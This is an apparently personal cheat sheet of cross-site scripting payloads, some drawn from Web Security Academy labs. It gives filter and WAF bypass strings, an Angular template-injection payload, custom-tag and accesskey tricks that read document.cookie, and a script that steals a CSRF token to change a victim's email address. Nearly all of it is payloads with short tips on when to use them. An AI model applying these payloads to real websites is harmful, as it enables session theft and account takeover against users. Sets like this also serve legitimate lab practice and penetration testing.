---
title: Cross Site Scripting ( XSS )
tags:
  - payload
  - infosec
  - xss
---
# Unique scripts which used to bypass specify situations

```javascript
onmouseover="alert('xss')
"><svg onload="alert('xss')">
<img src=# onerror='alert(1)'>
javascript:alert('xss')
'-alert(document.domain)-'
';alert(document.domain)//
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

# DOM XSS with Angular expression

```javascript
{{constructor.constructor('alert(1)')()}}
```

# Arithmetic operator with JS –> Cause Reflected DOM XSS

```javascript
\"-alert(1)}//
```

# Stored DOM XSS bypass the encode bracket

```javascript
<><img src=1 onerror=alert(1)>
```

# Script for executing CSRF Form for XSS by using token CSRF

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

# Tip for causing XSS with block by WAF (web applications firewall)

- Brute force to find the tag can available
- Try to execute attribute with tag available
- And force the website do the event –> Execute the XSS. For example

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

# Use own tag

>[!info]
>If on situation the server block all of tag can inject into the code –> we need to create them own like `<xss>`

```javascript
<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x
```

# Payload can help you filter xss via press event by key button to causing the reflect

```javascript
%27accesskey=%27x%27onclick=%27alert(1)
```

# Add `\` splash for bypass filter

>[!info]
>If some case study like they add black splash `/` after you input that with quote so with causing reflect xss using close tag for `</script>` for ignore that situation and after that causing payload

```javascript
<\script><script>alert(1)<\script>
```
